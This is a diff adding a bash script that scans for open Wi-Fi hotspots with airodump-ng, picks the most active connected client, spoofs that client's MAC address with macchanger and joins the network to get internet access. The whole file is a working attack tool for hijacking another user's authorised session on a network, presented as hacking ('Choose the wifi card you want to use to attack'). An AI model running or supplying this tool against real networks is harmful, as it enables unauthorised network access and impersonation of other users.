@@ -1,0 +1,153 @@
+#!/bin/bash
+
+command_exists () {
+    echo -ne "Checking for $1: \t"
+    if which $1 &> /dev/null
+    then
+        echo -e "\e[32mOK"
+    else
+        echo -e "\e[31mKO"
+        exit 1
+    fi
+    echo -ne "\e[0m"
+    sleep .5
+}
+
+menu () {
+    i=1
+
+    for x in "$@"
+    do
+        echo -e "[\e[96m$i\e[0m] $x"
+        let i=i+1
+    done
+    echo -e ""
+    read -p "choice: " choice_nb
+    choice=${!choice_nb}
+    if [ "$choice" == "" ]
+    then
+        menu "$@"
+    fi
+}
+
+choose_card () {
+    cards=$(/usr/sbin/ifconfig | grep "^wl" | cut -d : -f1)
+    nb_cards=$(/usr/sbin/ifconfig | grep "^wl" | cut -d : -f1 | wc -l)
+    if [ "$nb_cards" == "1" ]
+    then
+        card=$(/usr/sbin/ifconfig | grep "^wl" | cut -d : -f1)
+    elif [ "$nb_cards" == "0" ]
+    then
+        echo -e "\e[31mNo wifi card detected"
+        exit 1
+    else
+        clear
+        echo -e "Choose the wifi card you want to use to attack:"
+        echo -e ""
+        menu $cards
+        card=$choice
+    fi
+}
+
+find_max () {
+    max=0
+    line_max=0
+    line=1
+    re='^[0-9]+$'
+    for x in "$@"
+    do
+        if [[ $x =~ $re ]] && [ "$x" -gt "$max" ]
+        then
+            max="$x"
+            line_max="$line"
+        fi
+        let line=line+1
+    done
+}
+
+check_dump () {
+    clear
+    cat dump-01.csv | tail -n +3 | head -n -3 > dump
+    rm *.csv
+    packets="`cat dump | cut -d , -f11 | sed 's/ //g'`"
+    find_max $packets
+    if [ "$line_max" == "0" ]
+    then
+        echo -e "\e[31mNo vulnerable hotspot found...\e[0m"
+        rm dump
+        exit 1
+    fi
+    line="`cat dump | sed -n "${line_max}p"`"
+    echo $line
+    bssid="`echo $line | cut -d , -f1`"
+    essid="`echo $line | cut -d , -f14 | sed 's/ //g'`"
+    echo $bssid
+    echo $essid
+    rm dump
+}
+
+check_client () {
+    clear
+    cat client-01.csv | tail -n +6 | head -n -1 > client
+    rm *.csv
+    cat client
+    if [ "`cat client`" == "" ]
+    then
+        echo -e "\e[31mNo client found on the hotspot $essid...\e[0m"
+        rm client
+        exit 1
+    fi
+    packets="`cat client | cut -d , -f5 | sed 's/ //g'`"
+    find_max $packets
+    if [ "$line_max" == "0" ]
+    then
+        line_max="1"
+    fi
+    line="`cat client | sed -n "${line_max}p"`"
+    mac="`echo $line | cut -d , -f1`"
+    echo $mac
+    rm $client
+}
+
+change_mac () {
+    echo -e "Choose the wifi card you want to use to get internet:"
+    echo -e ""
+    menu $cards
+    card=$choice
+    service "`ls /etc/init.d | grep network`" stop
+    macchanger -m $mac $card
+    service "`ls /etc/init.d | grep network`" start
+}
+
+check_ping () {
+    wget -q --spider http://google.com
+
+    if [ $? -eq 0 ]; then
+        echo "Online"
+        echo "You are a foocking hacker!!!"
+    else
+        echo "Offline"
+    fi
+}
+
+if [ "$EUID" -ne 0 ]
+then
+    echo -e "\e[31mPlease run this program as root (use sudo)\e[0m"
+    exit
+fi
+
+#command_exists airodump-ng
+#command_exists macchanger
+clear
+
+choose_card
+echo $card
+timeout -sHUP --foreground 10 airodump-ng -w dump --encrypt OPN --output-format csv $card
+check_dump
+timeout -sHUP --foreground 20 airodump-ng -w client --encrypt OPN --output-format csv --bssid $bssid $card
+check_client
+change_mac
+iwconfig $card essid $essid
+echo -e "Waiting for connection"
+sleep 20
+check_ping
